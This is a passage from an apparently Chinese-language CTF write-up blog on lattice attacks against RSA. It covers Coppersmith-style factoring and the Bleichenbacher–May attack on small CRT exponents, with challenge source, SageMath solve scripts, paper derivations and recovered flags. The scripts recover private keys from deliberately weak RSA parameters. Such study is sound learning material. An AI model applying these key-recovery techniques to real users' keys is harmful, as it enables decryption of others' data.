g=yp^j*fp^i*e^(m-i)</span><br><span class="line">    poly.append(g)</span><br><span class="line">    <span class="keyword">for</span> mono <span class="keyword">in</span> g.monomials():</span><br><span class="line">        monomials.add(mono)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> S3:</span><br><span class="line">    i,j=item</span><br><span class="line">    g=fp^(i-j)*fq^j*e^(m-i)</span><br><span class="line">    poly.append(g)</span><br><span class="line">    <span class="keyword">for</span> mono <span class="keyword">in</span> g.monomials():</span><br><span class="line">        monomials.add(mono)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">A=Matrix(ZZ,<span class="built_in">len</span>(poly),<span class="built_in">len</span>(monomials))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造矩阵：置入多项式系数</span></span><br><span class="line"><span class="keyword">for</span> row,shift <span class="keyword">in</span> <span class="built_in">enumerate</span>(poly):</span><br><span class="line">    <span class="keyword">for</span> col,monomial <span class="keyword">in</span> <span class="built_in">enumerate</span>(monomials):</span><br><span class="line">        A[row,col]=shift.monomial_coefficient(monomial)*monomial(Xp,Yp) <span class="comment"># 代入Xp, Yp</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># LLL规约出系数</span></span><br><span class="line">basis = <span class="built_in">list</span>(A.LLL())</span><br><span class="line">found_polynomials = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 规约结果筛选</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(basis)):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(a+<span class="number">1</span>, <span class="built_in">len</span>(basis)):        </span><br><span class="line">        coe_f1=basis[a]</span><br><span class="line">        coe_f2=basis[b]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 生成over Z的新多项式</span></span><br><span class="line">        f1=getpoly(coe_f1,monomials).change_ring(ZZ)</span><br><span class="line">        f2=getpoly(coe_f2,monomials).change_ring(ZZ)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 结式</span></span><br><span class="line">        rr = f1.resultant(f2, xp)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断多项式优劣</span></span><br><span class="line">        <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;找到优质多项式系数，为向量&quot;</span>, a, <span class="string">&quot;和&quot;</span>, b)</span><br><span class="line">            found_polynomials = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found_polynomials:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> found_polynomials:</span><br><span class="line">    <span class="comment"># 结式求解yp</span></span><br><span class="line">    PR.&lt;p&gt; = PolynomialRing(ZZ)</span><br><span class="line">    rr = rr(p, p)  <span class="comment"># 转换为单元多项式</span></span><br><span class="line">    rr = rr.roots()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;所有可能解：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(rr)</span><br><span class="line">    </span><br><span class="line">    p = rr[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="keyword">assert</span> N%p == <span class="number">0</span></span><br><span class="line">    q = N // p</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = inverse_mod(e,phi)</span><br><span class="line">    m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,N))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">    <span class="comment"># b&#x27;TQLCTF&#123;C0pperSm1th_f0r_R5A_15_eazyyyyy@&#125;&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;无解&#x27;</span>)</span><br></pre></td></tr></table></figure><p>一些困惑</p><ul><li><p>划分、shift多项式从何而来？</p></li><li><p>m、t是怎么定的？</p></li><li><p>0.3819没出, 0.3200能出</p><p>也就是究竟是什么限制住了界呢🤔照理说，对着论文实现beta bound至少得是02年的0.382不是？</p></li></ul><h2 id="An-Attack-for-small-dp-dq"><a href="#An-Attack-for-small-dp-dq" class="headerlink" title="An Attack for small dp,dq"></a>An Attack for small dp,dq</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/415453702">春哥wp</a></li><li><a href="https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf">New Attacks on RSA with Small Secret CRT-Exponents: An Attack for dp, dq &lt; min{}</a></li><li><a href="https://www.iacr.org/archive/crypto2007/46220388/46220388.pdf">The New Attack on RSA-CRT</a></li></ul><h3 id="0CTF-TCTF-2021-ezrsa"><a href="#0CTF-TCTF-2021-ezrsa" class="headerlink" title="0CTF/TCTF 2021 ezrsa+"></a>0CTF/TCTF 2021 ezrsa+</h3><blockquote><p> 找了好久题目，最终于此<a href="https://scrapbox.io/crypto-writeup-public/0CTF_Finals_2021_%7C_ezrsa+#63ed44dfd520dc00001387f6">博客</a>找到</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from secret import flag</span><br><span class="line">from os import urandom</span><br><span class="line"></span><br><span class="line">def gen(n_size, m_size):</span><br><span class="line">    alpha = <span class="number">0.5</span></span><br><span class="line">    delta = <span class="number">0.03</span></span><br><span class="line">    d_size = int(delta * n_size)</span><br><span class="line">    k_size = int((alpha + delta - <span class="number">0.5</span>) * n_size)</span><br><span class="line">    c_size = int(n_size * (<span class="number">1</span> - alpha - <span class="number">2</span> * delta))</span><br><span class="line">    while True:</span><br><span class="line">        while True:</span><br><span class="line">            d_p = getRandomNBitInteger(d_size)</span><br><span class="line">            d_q = getRandomNBitInteger(d_size)</span><br><span class="line">            k = getRandomNBitInteger(k_size)</span><br><span class="line">            l = getRandomNBitInteger(k_size)</span><br><span class="line">            if GCD(k ,l) == <span class="number">1</span> and GCD(d_p, k) == <span class="number">1</span> and GCD(d_q, l) == <span class="number">1</span>:</span><br><span class="line">                break</span><br><span class="line">        e = inverse(d_p, k) * inverse(l, k) * l + inverse(d_q, l) * inverse(k, l) * k</span><br><span class="line">        c = getRandomNBitInteger(c_size)</span><br><span class="line">        e += c * k * l</span><br><span class="line">        assert e * d_q % l == <span class="number">1</span></span><br><span class="line">        assert e * d_p % k == <span class="number">1</span></span><br><span class="line">        p = (e * d_p - <span class="number">1</span>) <span class="comment">// k + 1</span></span><br><span class="line">        q = (e * d_q - <span class="number">1</span>) <span class="comment">// l + 1</span></span><br><span class="line">        if isPrime(p) and isPrime(q):</span><br><span class="line">            mask = <span class="number">2</span> ** m_size - <span class="number">1</span></span><br><span class="line">            return (p * q, e), (d_p, d_q, p, q), (d_p <span class="meta">&amp; mask, d_q &amp; mask) </span></span><br><span class="line"></span><br><span class="line">def encrypt(m, pk):</span><br><span class="line">    n, e = pk</span><br><span class="line">    return <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">n_size = <span class="number">2000</span></span><br><span class="line">m_size = <span class="number">12</span></span><br><span class="line">pk, sk, hint = gen(n_size, m_size)</span><br><span class="line">flag = urandom(n_size <span class="comment">// 8 - len(flag) - 1) + flag</span></span><br><span class="line">enc = encrypt(int(flag.hex(), <span class="number">16</span>), pk)</span><br><span class="line"></span><br><span class="line">print(pk)</span><br><span class="line">print(hint)</span><br><span class="line">print(enc)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">(<span class="number">59431693643925</span><span class="number">79648240628105</span><span class="number">46540026556163</span><span class="number">04777198491403</span><span class="number">42288893646282</span><span class="number">35884586482919</span><span class="number">64649042984250</span><span class="number">34495515703590</span><span class="number">71569616668934</span><span class="number">18497884237901</span><span class="number">18035115884268</span><span class="number">05845005776689</span><span class="number">14187616271363</span><span class="number">86260375534474</span><span class="number">23828729472257</span><span class="number">50872917044326</span><span class="number">81906513559934</span><span class="number">96080174615819</span><span class="number">13551414304076</span><span class="number">98622886747610</span><span class="number">81885355458451</span><span class="number">93694926972999</span><span class="number">61587570531415</span><span class="number">59841060292685</span><span class="number">07876152666001</span><span class="number">94130088653542</span><span class="number">08029727289814</span><span class="number">28221262157642</span><span class="number">85317511778718</span><span class="number">86282502493924</span><span class="number">17499968116036</span><span class="number">10592132845393</span><span class="number">75556461887196</span><span class="number">77168191739355</span><span class="number">53139267269362</span><span class="number">45142380241984</span><span class="number">79198014125172</span><span class="number">94612793840767</span><span class="number">03766258923342</span><span class="number">23892820920518</span><span class="number">66024514599213</span><span class="number">44559603068532</span><span class="number">522726960979</span>9, <span class="number">17627272704426</span><span class="number">07836236621349</span><span class="number">00450561350635</span><span class="number">94151689299665</span><span class="number">40357011133047</span><span class="number">32110120360534</span><span class="number">02010167572034</span><span class="number">07375680206339</span><span class="number">34146508863912</span><span class="number">90392780274841</span><span class="number">28644822299382</span><span class="number">12144245652580</span><span class="number">36353691251572</span><span class="number">61704416172232</span><span class="number">69505833216731</span><span class="number">07079994732217</span><span class="number">69390010733123</span><span class="number">91095550847700</span><span class="number">94111131661411</span><span class="number">88309425895082</span><span class="number">60853427159407</span><span class="number">621882</span>7)</span><br><span class="line">(<span class="number">1361</span>, <span class="number">1475</span>)</span><br><span class="line"><span class="number">45315424376928</span><span class="number">18645025309324</span><span class="number">01591243318416</span><span class="number">51812523937917</span><span class="number">11464775823247</span><span class="number">40212713956901</span><span class="number">06579353033624</span><span class="number">40253951226047</span><span class="number">22461011201063</span><span class="number">22264356109751</span><span class="number">18324658493911</span><span class="number">65801695571722</span><span class="number">87412912661243</span><span class="number">72004503735693</span><span class="number">12481006804169</span><span class="number">27307061678276</span><span class="number">66860062121413</span><span class="number">28405392154834</span><span class="number">59245639032119</span><span class="number">59003376490264</span><span class="number">22881441550010</span><span class="number">68474828932389</span><span class="number">07846512437694</span><span class="number">00678552786772</span><span class="number">91272283613885</span><span class="number">92714377847012</span><span class="number">08631247137206</span><span class="number">17230175607058</span><span class="number">90925568994607</span><span class="number">97283237336238</span><span class="number">02265665063689</span><span class="number">32968108567819</span><span class="number">18858714882919</span><span class="number">08118915552831</span><span class="number">57485379418388</span><span class="number">71591029995122</span><span class="number">84046485352356</span><span class="number">75640369275644</span><span class="number">49361425003785</span><span class="number">72127684508606</span><span class="number">47393276921502</span><span class="number">40705755720888</span><span class="number">507327653364</span>4</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="My-try"><a href="#My-try" class="headerlink" title="My try"></a>My try</h3><p>春哥知乎文章有处笔误，如下（已改正）<br>$$<br>\begin{aligned} k(p-1) &amp;= ed_p-1 \\ l(q-1) &amp;= ed_q - 1\end{aligned}<br>$$<br>解下来尝试自己构造格，因为不会利用bound，就按本能来构造</p><p>首先上面两个式子未知量太多，我们有N却没用上，自然地想到表示出p、q再相乘，如下<br>$$<br>\begin{aligned} p &amp;= \frac{ed_p-1+k}{k} \\ q &amp;= \frac{ed_q - 1+l}{l} \\ 相乘，得：\<br>N &amp;= \frac{(ed_p-1+k)(ed_q - 1+l)}{kl} \\ \therefore Nkl &amp;= e^2(d_pd_q)+e(ld_p-d_p-d_q+kd_q)+kl-k-l+1 \end{aligned}<br>$$</p><p>然后，本着表示出要求量k的想法，我做了如下尝试<br>$$<br>\begin{aligned} k &amp;= e^2(d_pd_q)+e(ld_p-d_p-d_q+kd_q)+kl(1-N)-l+1 \\<br>&amp; = e^2A+eB+(1-N)C+D\end{aligned}<br>$$<br>有如下构造<br>$$<br>\begin{bmatrix} A&amp;B&amp;C&amp;D \end{bmatrix}  \begin{bmatrix} e^2&amp;1&amp;0&amp;0&amp;0 \\ e&amp;0&amp;1&amp;0&amp;0 \\<br>1-N&amp;0&amp;0&amp;1&amp;0 \\ 1&amp;0&amp;0&amp;0&amp;1\end{bmatrix} =<br>\begin{bmatrix} k&amp;A&amp;B&amp;C&amp;D  \end{bmatrix}<br>$$<br>尝试在第一列乘大数调参，无果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">N, e = (<span class="number">5943169364392579648240628105465400265561630477719849140342288893646282358845864829196464904298425034495515703590715696166689341849788423790118035115884268058450057766891418761627136386260375534474238287294722575087291704432681906513559934960801746158191355141430407698622886747610818853554584519369492697299961587570531415598410602926850787615266600194130088653542080297272898142822126215764285317511778718862825024939241749996811603610592132845393755564618871967716819173935553139267269362451423802419847919801412517294612793840767037662589233422389282092051866024514599213445596030685325227269609799</span>, <span class="number">1762727270442607836236621349004505613506359415168929966540357011133047321101203605340201016757203407375680206339341465088639129039278027484128644822299382121442456525803635369125157261704416172232695058332167310707999473221769390010733123910955508477009411113166141188309425895082608534271594076218827</span>)</span><br><span class="line">dpl, dql = (<span class="number">1361</span>, <span class="number">1475</span>)</span><br><span class="line"></span><br><span class="line">tmp = <span class="number">2</span>^<span class="number">439</span></span><br><span class="line">M = Matrix(ZZ,<span class="selector-attr">[[tmp*(e^2), 1, 0, 0, 0]</span>,</span><br><span class="line">                <span class="selector-attr">[   tmp*e, 0, 1, 0, 0]</span>,</span><br><span class="line">               <span class="selector-attr">[tmp*(1-N), 0, 0, 1, 0]</span>,</span><br><span class="line">                <span class="selector-attr">[   tmp*1, 0, 0, 0, 1]</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> M<span class="selector-class">.LLL</span>():</span><br><span class="line">    tt = int(each<span class="selector-attr">[0]</span><span class="comment">//tmp)</span></span><br><span class="line">    print(tt<span class="selector-class">.bit_length</span>(), tt)</span><br></pre></td></tr></table></figure><p>看回春哥构造, 如下<br>$$<br>\begin{aligned} k+l-1 &amp;= e^2(d_pd_q)+e(ld_p-d_p-d_q+kd_q)+kl(1-N) \\<br>&amp; = e^2A+eB+(1-N)C\end{aligned}<br>$$<br>格构造如下<br>$$<br>\begin{bmatrix} A&amp;B&amp;C \end{bmatrix}  \begin{bmatrix} e^2&amp;1&amp;0&amp;0 \\ e&amp;0&amp;1&amp;0 \\<br>1-N&amp;0&amp;0&amp;1 \end{bmatrix} =<br>\begin{bmatrix} k+l-1&amp;A&amp;B&amp;C  \end{bmatrix}<br>$$<br>再乘如下对角矩阵调参(本质上就是矩阵M第一列乘$2^{60}$)<br>$$<br>\begin{bmatrix} 2^{60}&amp;0&amp;0&amp;0 \\ 0&amp;1&amp;0&amp;0 \\ 0&amp;0&amp;1&amp;0 \\ 0&amp;0&amp;0&amp;1 \end{bmatrix}<br>$$<br>LLL得到结果后，四个方程解四未知量，本题得解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N, e = (<span class="number">5943169364392579648240628105465400265561630477719849140342288893646282358845864829196464904298425034495515703590715696166689341849788423790118035115884268058450057766891418761627136386260375534474238287294722575087291704432681906513559934960801746158191355141430407698622886747610818853554584519369492697299961587570531415598410602926850787615266600194130088653542080297272898142822126215764285317511778718862825024939241749996811603610592132845393755564618871967716819173935553139267269362451423802419847919801412517294612793840767037662589233422389282092051866024514599213445596030685325227269609799</span>, <span class="number">1762727270442607836236621349004505613506359415168929966540357011133047321101203605340201016757203407375680206339341465088639129039278027484128644822299382121442456525803635369125157261704416172232695058332167310707999473221769390010733123910955508477009411113166141188309425895082608534271594076218827</span>)</span><br><span class="line">c = <span class="number">4531542437692818645025309324015912433184165181252393791711464775823247402127139569010657935303362440253951226047224610112010632226435610975118324658493911658016955717228741291266124372004503735693124810068041692730706167827666860062121413284053921548345924563903211959003376490264228814415500106847482893238907846512437694006785527867729127228361388592714377847012086312471372061723017560705890925568994607972832373362380226566506368932968108567819188587148829190811891555283157485379418388715910299951228404648535235675640369275644493614250037857212768450860647393276921502407057557208885073276533644</span></span><br><span class="line">dpl, dql = (<span class="number">1361</span>, <span class="number">1475</span>)</span><br><span class="line"></span><br><span class="line">tmp = <span class="number">2</span>^<span class="number">0</span></span><br><span class="line"><span class="comment"># tmp = 2^60</span></span><br><span class="line">M = Matrix(ZZ,[[tmp*(e^<span class="number">2</span>), <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                [   tmp*e, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">               [tmp*(<span class="number">1</span>-N), <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kl1, A, B, C = [<span class="built_in">abs</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> M.LLL()[<span class="number">0</span>]]</span><br><span class="line"><span class="built_in">print</span>(kl1//tmp)</span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"><span class="built_in">print</span>(B)</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line">var(<span class="string">&quot;k l dp dq&quot;</span>)</span><br><span class="line">root = solve([k+l-<span class="number">1</span>-kl1//tmp, dp*dq-A, dp*(l-<span class="number">1</span>)+dq*(k-<span class="number">1</span>)-B, k*l-C], k,l,dp,dq)</span><br><span class="line"><span class="built_in">print</span>(root)</span><br><span class="line"></span><br><span class="line">k = <span class="number">677847543357427193</span></span><br><span class="line">l = <span class="number">609451322654059464</span></span><br><span class="line">dp = <span class="number">940347048219567441</span></span><br><span class="line">dq = <span class="number">840292997966509507</span></span><br><span class="line"></span><br><span class="line">p = (e*dp-<span class="number">1</span>+k)//k</span><br><span class="line">q = N//p</span><br><span class="line">d = inverse_mod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,N))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># flag&#123;s0rry_4_the_si11y_mis7ak3!!!&#125;</span></span><br></pre></td></tr></table></figure><p>也发现不乘对角矩阵（即不调参）也能出</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>构造格列式时，未知量相对来说宜少不宜多（格维度与之有关）</li><li>也不一定说非要按照表示未知量的思路来构造格</li><li>还是不会算bound</li></ul><h3 id="Paper"><a href="#Paper" class="headerlink" title="Paper"></a>Paper</h3><p>回过来，看论文解。</p><p>先是 Bleichenbacher and May提出的<a href="https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf">New Attacks on RSA with Small Secret CRT-Exponents</a>，针对其中第5章<strong>An Attack for dp,dq &lt; min{$\frac{1}{4}(\frac{N}{e})^{\frac{2}{5}}, \frac{1}{3}N^{\frac{1}{4}}$}</strong>，有如下:<br>$$<br>\begin{aligned} e(ld_p-d_p-d_q+kd_q) + kl(1-N) + e^2(d_pd_q) &amp;= k+l-1 \\ 简写为：ex + y(1-N)+e^2w &amp;= z \end{aligned}<br>$$<br>其中<br>$$<br>\begin{aligned} w&amp;= d_pd_q \\ x&amp;= d_p(l-1)+d_q(k-1) \\ y&amp;=kl \\ z&amp;=k+l-1 \end{aligned}<br>$$</p><p>因有dp、dq bound: dp、dq &lt;  $\frac{1}{4}(\frac{N}{e})^{\frac{2}{5}}$，可推得其余参量bound如下：<br>$$<br>\begin{aligned} l \approx k = \frac{ed_p-1}{p-1} \leq 2ed_pN^{-\frac{1}{2}} &amp;\leq \frac{1}{2}e^\frac{3}{5}N^{-\frac{1}{10}} ,\\ x &amp;\leq \frac{1}{4}e^\frac{1}{5}N^\frac{3}{10} ,\\ y &amp;\leq \frac{1}{4}e^\frac{6}{5}N^{-\frac{1}{5}} ,\\ z &amp;\leq e^\frac{3}{5}N^{^-\frac{1}{10}}. \end{aligned}<br>$$<br>如下构造格<br>$$<br>\begin{bmatrix} x&amp;y&amp;w \end{bmatrix}  \begin{bmatrix} 1&amp;0&amp;e \\ 0&amp;1&amp;1-N \\<br>0&amp;0&amp;e^2 \end{bmatrix} =<br>\begin{bmatrix} x&amp;y&amp;z  \end{bmatrix}<br>$$<br>其中<br>$$<br>\begin{aligned} B_1 &amp;= \begin{bmatrix} 1&amp;0&amp;e \\ 0&amp;1&amp;1-N \\ 0&amp;0&amp;e^2 \end{bmatrix} ,\\ v_1 &amp;= (x, y, z). \end{aligned}<br>$$<br>为平衡$v_1$（即让$v_1$中各分量有相同比特位大小），根据上文中$x、y、z$的大小关系，可把$v_1$各参数限制在$e^\frac{6}{5}N^\frac{3}{10}$,如下<br>$$<br>\begin{aligned}  x \cdot 4e &amp;\leq e^\frac{6}{5}N^\frac{3}{10} ,\\ y \cdot 4N^\frac{1}{2} &amp;\leq e^\frac{6}{5}N^\frac{3}{10} ,\\ z \cdot e^\frac{3}{5}N^\frac{2}{5} &amp;\leq e^\frac{6}{5}N^\frac{3}{10}. \end{aligned}<br>$$<br>于是，有<br>$$<br>\begin{aligned} x \cdot 4e &amp;= x \cdot 4e  ,\\ y \cdot 4N^\frac{1}{2} &amp;= y \cdot 4N^\frac{1}{2} ,\\ ex \cdot e^\frac{3}{5}N^\frac{2}{5} + y(1-N) \cdot e^\frac{3}{5}N^\frac{2}{5} +e^2w \cdot e^\frac{3}{5}N^\frac{2}{5} &amp;= z\cdot e^\frac{3}{5}N^\frac{2}{5} .\\ \end{aligned}<br>$$<br>对于格的构造，则有<br>$$<br>\begin{bmatrix} x&amp;y&amp;w \end{bmatrix}<br>\begin{bmatrix} 4e&amp;0&amp;e^\frac{8}{5}N^\frac{2}{5} \\ 0&amp;4N^\frac{1}{2}&amp; e^\frac{3}{5}N^\frac{2}{5}(1-N) \\<br>0&amp;0&amp;e^\frac{13}{5}N^\frac{2}{5} \end{bmatrix} =<br>\begin{bmatrix} x \cdot 4e&amp;y \cdot 4N^\frac{1}{2}&amp;z\cdot e^\frac{3}{5}N^\frac{2}{5}  \end{bmatrix}<br>$$<br>其中<br>$$<br>\begin{aligned}  B_2 &amp;= \begin{bmatrix} 4e&amp;0&amp;e^\frac{8}{5}N^\frac{2}{5} \\ 0&amp;4N^\frac{1}{2}&amp; e^\frac{3}{5}N^\frac{2}{5}(1-N) \\ 0&amp;0&amp;e^\frac{13}{5}N^\frac{2}{5} \end{bmatrix} ,\\ v_2 &amp;= (x \cdot 4e, y \cdot 4N^\frac{1}{2}, z\cdot e^\frac{3}{5}N^\frac{2}{5}). \end{aligned}<br>$$<br>而$v_2$的范数（长度）$||v_2|| \leq  \sqrt{3}e^\frac{6}{5}N^\frac{3}{10}$，通过Minkowski’s theorem可知，由$B_2$构成的格$L_2$中最短向量长度满足<br>$$<br>\lambda_1(L_2) \leq \sqrt{3} \cdot {det(L_2)^\frac{1}{3}} = \sqrt{3}(4^2e^\frac{18}{5}N^\frac{9}{10})^\frac{1}{3}=4^\frac{2}{3} \cdot \sqrt{3}e^\frac{6}{5}N^\frac{3}{10}.<br>$$<br>且论文也提出，又因为$d_p, d_q \leq \frac{1}{3}N^\frac{1}{4}$ 避免了其他短向量的情况，更可以基本确定$v_2$就是$L_2$中的最短向量。</p><p>通过LLL获得$v_2$后，我们可以得到$x,y,z$，通过$x,y,z$可通过$ex + y(1-N)+e^2w = z$求解出$w$; 而通过$y,z$又可以求得$k,l$;最后，再通过$w, x,l,k$可求出$d_p, d_q$。</p><p>于是，$p = \frac{ed_p-1+k}{k}$，N成功分解。</p><p><strong>代码实现</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N, e = (<span class="number">5943169364392579648240628105465400265561630477719849140342288893646282358845864829196464904298425034495515703590715696166689341849788423790118035115884268058450057766891418761627136386260375534474238287294722575087291704432681906513559934960801746158191355141430407698622886747610818853554584519369492697299961587570531415598410602926850787615266600194130088653542080297272898142822126215764285317511778718862825024939241749996811603610592132845393755564618871967716819173935553139267269362451423802419847919801412517294612793840767037662589233422389282092051866024514599213445596030685325227269609799</span>, <span class="number">1762727270442607836236621349004505613506359415168929966540357011133047321101203605340201016757203407375680206339341465088639129039278027484128644822299382121442456525803635369125157261704416172232695058332167310707999473221769390010733123910955508477009411113166141188309425895082608534271594076218827</span>)</span><br><span class="line">c = <span class="number">4531542437692818645025309324015912433184165181252393791711464775823247402127139569010657935303362440253951226047224610112010632226435610975118324658493911658016955717228741291266124372004503735693124810068041692730706167827666860062121413284053921548345924563903211959003376490264228814415500106847482893238907846512437694006785527867729127228361388592714377847012086312471372061723017560705890925568994607972832373362380226566506368932968108567819188587148829190811891555283157485379418388715910299951228404648535235675640369275644493614250037857212768450860647393276921502407057557208885073276533644</span></span><br><span class="line"></span><br><span class="line">dpl, dql = (<span class="number">1361</span>, <span class="number">1475</span>)</span><br><span class="line"></span><br><span class="line">M = Matrix(ZZ,[[<span class="number">1</span>, <span class="number">0</span>, e],</span><br><span class="line">               [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>-N],</span><br><span class="line">               [<span class="number">0</span>, <span class="number">0</span>, e^<span class="number">2</span>]])</span><br><span class="line"></span><br><span class="line">tmp = diagonal_matrix([<span class="number">4</span>*e, ceil(<span class="number">4</span>*N^(<span class="number">1</span>/<span class="number">2</span>)), ceil(e^(<span class="number">3</span>/<span class="number">5</span>)*N^(<span class="number">2</span>/<span class="number">5</span>))])</span><br><span class="line"></span><br><span class="line">M = M*tmp</span><br><span class="line">x, y, z = M.LLL()[<span class="number">0</span>]/tmp</span><br><span class="line"></span><br><span class="line">var(<span class="string">&#x27;dp dq k l w&#x27;</span>)</span><br><span class="line">roots = solve([e*x+y*(<span class="number">1</span>-N)+e^<span class="number">2</span>*w-z, dp*dq-w, dp*(l-<span class="number">1</span>)+dq*(k-<span class="number">1</span>)-x, k*l-y,k+l-<span class="number">1</span>-z], dp,dq,k,l,w)</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br><span class="line"></span><br><span class="line">dp = <span class="number">840292997966509507</span></span><br><span class="line">dq = <span class="number">940347048219567441</span></span><br><span class="line">k = <span class="number">609451322654059464</span></span><br><span class="line">l = <span class="number">677847543357427193</span></span><br><span class="line">w= <span class="number">790167040277378201025110032154161587</span></span><br><span class="line"></span><br><span class="line">p = (e*dp-<span class="number">1</span>+k)//k</span><br><span class="line">q = N//p</span><br><span class="line">d = inverse_mod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">int</span>(<span 